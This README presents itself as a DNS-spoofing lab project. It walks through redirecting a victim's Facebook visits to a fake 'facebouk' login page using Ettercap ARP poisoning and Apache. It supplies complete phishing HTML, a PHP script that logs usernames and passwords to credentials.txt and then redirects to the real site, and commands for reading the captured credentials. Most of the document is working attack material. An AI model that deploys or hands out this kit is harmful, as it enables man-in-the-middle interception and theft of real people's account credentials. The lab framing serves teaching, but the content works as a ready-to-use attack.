# DNS_Spoofing_Project
A Practical Lab Project Demonstrating DNS Spoofing Attacks.

# DNS Spoofing Fake Facebook Project

## Project Overview
This project demonstrates a DNS spoofing attack using Kali Linux and Ettercap. The attacker redirects a victim’s browser from the real Facebook website to a fake login page ("facebouk") hosted on the attacker’s machine. The goal is to capture the victim’s login credentials.

---

## Tools Used
- Kali Linux (Attacker)
- Apache2 Web Server
- Ettercap
- Victim Machine (Windows/Linux on same network)

---

## Prerequisites
- Kali Linux installed with Apache2 and Ettercap
- Victim machine connected to same local network
- Basic knowledge of network and Linux commands

---

## Setup Instructions

### 1. Setup Apache Server
```bash
# Create folder for fake site
sudo mkdir -p /var/www/html/facebouk


# Copy your fake Facebook files (HTML, PHP, CSS) into this folder
# Example:
sudo cp -r /path/to/fake_facebook_files/* /var/www/html/facebouk/

# Set permissions
sudo chown -R www-data:www-data /var/www/html/facebouk
sudo chmod -R 755 /var/www/html/facebouk

# Start Apache server
sudo systemctl start apache2
sudo systemctl enable apache2
```
### 2. Configure Ettercap DNS Spoofing
```bash
# Edit DNS spoof file
sudo nano /etc/ettercap/etter.dns

# Add these lines (replace 192.168.x.x with your Kali Linux IP):
facebouk.com A 192.168.x.x
www.facebouk.com A 192.168.x.x

```
### 3. Start Ettercap to perform ARP poisoning and DNS spoofing
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /victim_ip// /gateway_ip// -P dns_spoof

# Replace eth0 with your Kali network interface (find with ifconfig or ip a).
# Replace victim_ip with victim’s IP address.
# Replace gateway_ip with your router’s IP address.

```



### Example Fake Facebook Login Page Code
```bash
# HTML (index.html)
<!DOCTYPE html>
<html>
<head>
  <title>Facebook Login</title>
</head>
<body>
  <h2>Login to Facebook</h2>
  <form action="login.php" method="POST">
    Username: <input type="text" name="username" required><br><br>
    Password: <input type="password" name="password" required><br><br>
    <input type="submit" value="Log In">
  </form>
</body>
</html>


# PHP to Capture Credentials (login.php)

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];

    // Save credentials to a file
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Username: $user | Password: $pass\n");
    fclose($file);

    // Redirect to real Facebook page after capturing credentials
    header("Location: https://www.facebook.com");
    exit();
}
?>


```
### How to Test

- Make sure Apache is running and hosting fake site at http://192.168.x.x/facebouk.
- Run Ettercap as above.
- On victim machine, open browser and visit facebook.com.
- Victim should see the fake Facebook login page.
- Entered credentials will be saved in credentials.txt inside /var/www/html/facebouk/.

### 4. 4. Check captured credentials
```bash
#On your Kali Linux attacker machine:
cat /var/www/html/facebouk/credentials.txt

"You should see the username and password entered by the victim"

```
### Troubleshooting
- If victim is not redirected:
- Verify IP addresses used are correct.
- Check Apache service is running: sudo systemctl status apache2
- Clear DNS cache on victim (Windows: ipconfig /flushdns).
- If Ettercap gives errors:
- Run with sudo.
- Check network interface name.
- Disable firewall if blocking traffic.

### Summary of Important Commands
```bash
# Start Apache server
sudo systemctl start apache2

# Enable Apache at boot
sudo systemctl enable apache2

# Edit etter.dns to add spoof entries
sudo nano /etc/ettercap/etter.dns

# Run ettercap with ARP poisoning and DNS spoofing
sudo ettercap -T -q -i eth0 -M arp:remote /victim_ip// /gateway_ip// -P dns_spoof



